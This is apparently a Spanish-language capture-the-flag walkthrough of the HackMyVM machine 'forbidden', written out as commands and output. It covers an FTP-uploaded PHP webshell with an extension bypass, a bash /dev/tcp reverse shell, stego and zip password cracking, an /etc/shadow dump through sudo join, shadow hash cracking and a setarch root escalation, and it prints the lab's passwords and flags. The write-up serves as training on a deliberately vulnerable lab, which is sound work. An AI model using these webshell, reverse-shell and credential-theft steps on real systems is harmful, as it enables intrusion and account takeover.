---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# forbidden HackMyVM (Intermediate- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 14:45 EDT
Nmap scan report for 192.168.28.21
Host is up (0.00084s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Oct 09  2020 www [NSE: writeable]
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:56:3D:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```

Vemos varias cosas interesantes entre ellas un servidor `FTP` vamos a probar si el `FTP` se puede entrar de forma anonima.

## FTP

```shell
ftp anonymous@<IP>
```

Si dejamos la contraseña en blanco veremos que si nos deja, por lo que si listamos el directorio veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||43462|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Oct 09  2020 .
drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..
drwxrwxrwx    2 0        0            4096 Oct 09  2020 www
226 Directory send OK.
```

Vemos una carpeta llamada `www` y si entramos dentro veremos lo siguiente:

```shell
cd www/
ls -la
```

Info:

```
229 Entering Extended Passive Mode (|||14447|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Oct 09  2020 .
drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..
-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt
226 Directory send OK.
```

Vemos lo que parece el contenido de la pagina del puerto `80` por lo que podemos probar a subir una `webshell.php`, pero antes vamos a ver que pone la `note.txt`:

```
URL = http://<IP>/note.txt
```

Info:

```
The extra-secured .jpg file contains my password but nobody can obtain it.
```

Con esto confirmamos que si se esta compariendo la pagina web mediante el `FTP` por lo que vamos a crear el siguiente `webshell.php`:

> webshell.php

```php
<?php system($_GET['cmd']); ?>
```

Ahora vamos a subirlo mediante `FTP` dentro de la carpeta `www` de la siguiente forma:

```shell
put webshell.php
```

Echo esto vamos a probar a entrar a la pagina y dentro de la misma acceder al archivo directamente de esta forma:

```
URL = http://<IP>/webshell.php?cmd=whoami
```

Pero nos descargara el archivo, por lo que vamos a probar a utilizar `bypasses` de las extensiones de `PHP`.

URL = [Bypasses Extensiones](https://github.com/malware-d/template/blob/master/example_attack/Bypassing%20File%20Upload%20Restrictions.md)

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

Vamos a probar `.php5` a ver si funciona y no nos descarga el archivo.

```shell
mv webshell.php webshell.php5
```

Ahora dentro del `FTP` vamos a pasarnos dicho archivo:

```shell
put webshell.php5
```

Ahora si probamos a meternos con el archivo subido nuevo veremos lo siguiente:

```
URL = http://<IP>/webshell.php5?cmd=whoami
```

Info:

```
www-data
```

## Escalate user www-data

Veremos que con esto funciona por lo que vamos a probar a crearnos una `reverse shell` de esta forma:

```
URL = http://<IP>/webshell.php5?cmd=bash -c "bash -i >%26 /dev/tcp/<IP>/<PORT> 0>%261"
```

Antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el `payload` de la pagina web, y volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.28.19] from (UNKNOWN) [192.168.28.21] 53344
bash: cannot set terminal process group (347): Inappropriate ioctl for device
bash: no job control in this shell
www-data@forbidden:/srv/ftp/www$ whoami
whoami
www-data
```

Veremos que nos funciono por lo que vamos a sanitizar la `shell`.

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user marta

Como recordamos antes nos comento en la pagina web en la `note.txt` que hay una imagen coulta con extension `.jpg` en el servidor, por lo que vamos a buscarlo de la siguiente forma:

```shell
find / -name "*.jpg" 2>/dev/null
```

Info:

```
/var/www/html/TOPSECRETIMAGE.jpg
```

Veremos que la imagen esta en dicha ruta, vamos a exportar la imagen a nuestro `host` abriendo un servidor de `python3`:

```shell
cd /var/www/html/
python3 -m http.server
```

Ahora en el `host` ejecutaremos lo siguiente:

```shell
wget http://<IP_VICTIM>:8000/TOPSECRETIMAGE.jpg
```

Una vez que lo tengamos descargado, vamos a ver que aparece en la imagen:

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Veremos que no hay nada interesante, pero vamos a intentar ver si dentro de esta imagen oculta algun archivo o algo por el estilo:

### stegcracker/steghide

```shell
steghide extract -sf TOPSECRETIMAGE.jpg
```

No pedira una contraseña, pero si la dejamos vacia, no nos va a extraer nada, por lo que vamos a realizar fuerza bruta con una herramienta llamada `stegcracker`:

```shell
stegcracker  TOPSECRETIMAGE.jpg <WORDLIST>
```

Info:

```
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'TOPSECRETIMAGE.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: portugal
Tried 813 passwords
Your file has been written to: TOPSECRETIMAGE.jpg.out
portugal
```

Veremos que la contraseña es `portugal` por lo que vamos a probarla enviando el mismo comando del principio:

```shell
steghide extract -sf TOPSECRETIMAGE.jpg
```

Metemos como contraseña `portugal` y veremos que si nos ha extraido un `.zip`.

Info:

```
Enter passphrase: 
wrote extracted data to "pass.zip".
```

Si intentamos descomprimir el archivo `ZIP` veremos que nos pide una contraseña, por lo que vamos a probar a `crackearla`.

```shell
zip2john pass.zip > hash.zip
```

```shell
john --wordlist=<WORDLIST> hash.zip
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret           (pass.zip/pass.txt)     
1g 0:00:00:00 DONE (2025-04-23 12:10) 12.50g/s 102400p/s 102400c/s 102400C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado por lo que vamos a descomprimirlo metiendo dicha contraseña:

```shell
unzip pass.zip
```

Metemos como contraseña `secret` y veremos que nos descomprime un archivo llamado `pass.txt` si lo leemos veremos lo siguiente:

```
- .... .
.--. .- ... ... .-- --- .-. -..
.. ... ---...

vGffXfDreF453!
```

Vamos a descodificar el codigo `morse`:

```
THEPASSWORDIS:

vGffXfDreF453!
```

Por lo que vemos nos indica que la contraseña de algun usuario es `vGffXfDreF453!`, pero si probamos con todos los usuarios, veremos que no hay suerte, por mas que probemos no coincidiran, pero si probamos a meter como contraseña en el usuario `marta` el nombre de la imagen:

```shell
su marta
```

Metemos como contraseña `TOPSECRETIMAGE` y veremos que si funciona.

Info:

```
marta@forbidden:/var/www/html$ whoami
marta
```

## Escalate user markos

Si vamos a la `/home` del usuario `marta` veremos un archivo `.c` que contiene lo siguiente:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(1001); setgid(1001); system("/bin/bash");
}
```

Vemos que si se ejecuta ese binario de forma compilada obtendriamos una `bash` como el usuario `markos` que pertenece al `ID` `1001`, pero si vemos hay un archivo `compilado` llamado `.forbidden` el cual tiene toda la pinta de que es ese `.c` por lo que vamos a probar a ejecutarlo.

```shell
./.forbidden
```

Ahora si vemos que usuarios somos:

```shell
whoami
```

Info:

```
markos
```

Vemos que ha funcionado y ya seremos dicho usuario, por lo que leeremos la `flag` del usuario:

> user.txt

```
HMVpussycat
```

## Escalate user peter

Con el usuario `markos` veremos que no podemos hacer gran cosa, si volvemos al usuario `marta` y hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for marta on forbidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
```

Veremos que podemos ejecutar el binario `join` como el usuario `root`, por lo que haremos lo siguiente:

```shell
LFILE=/etc/shadow
sudo join -a 2 /dev/null $LFILE
```

Info:

```
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::
daemon:*:18544:0:99999:7:::
bin:*:18544:0:99999:7:::
sys:*:18544:0:99999:7:::
sync:*:18544:0:99999:7:::
games:*:18544:0:99999:7:::
man:*:18544:0:99999:7:::
lp:*:18544:0:99999:7:::
mail:*:18544:0:99999:7:::
news:*:18544:0:99999:7:::
uucp:*:18544:0:99999:7:::
proxy:*:18544:0:99999:7:::
www-data:*:18544:0:99999:7:::
backup:*:18544:0:99999:7:::
list:*:18544:0:99999:7:::
irc:*:18544:0:99999:7:::
gnats:*:18544:0:99999:7:::
nobody:*:18544:0:99999:7:::
_apt:*:18544:0:99999:7:::
systemd-timesync:*:18544:0:99999:7:::
systemd-network:*:18544:0:99999:7:::
systemd-resolve:*:18544:0:99999:7:::
messagebus:*:18544:0:99999:7:::
marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::
systemd-coredump:!!:18544::::::
ftp:*:18544:0:99999:7:::
sshd:*:18544:0:99999:7:::
markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
```

Vemos que funciona, por lo que vamos a intentar `crackear` todas las contraseñas a ver cual conseguimos:

> hash.shadow

```
peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81
root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51
```

Solamente vamos a utilizar el de `root` y el de `peter` ya que los demas nos dan igual.

```shell
john --wordlist=<WORDLIST> hash.shadow
```

Info:

```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
boomer           (peter)     
1g 0:00:00:23 0.33% (ETA: 14:24:17) 0.04175g/s 2351p/s 2394c/s 2394C/s simple123..miyagi
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Vemos que la contraseña de `peter` nos lo ha descubierto, por lo que vamos a escalar a dicho usuario:

```shell
su peter
```

Metemos como contraseña `boomer` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for peter on forbidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/setarch
```

Veremos que podemos ejecutar el binario `setarch` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo setarch $(uname -m) /bin/bash
```

Info:

```
root@forbidden:/home/marta# whoami
root
```

Con esto veremos que ya seremos `root` por lo que leeremos la `flag` del usuario `root`:

> root.txt

```
HMVmymymymymind
```
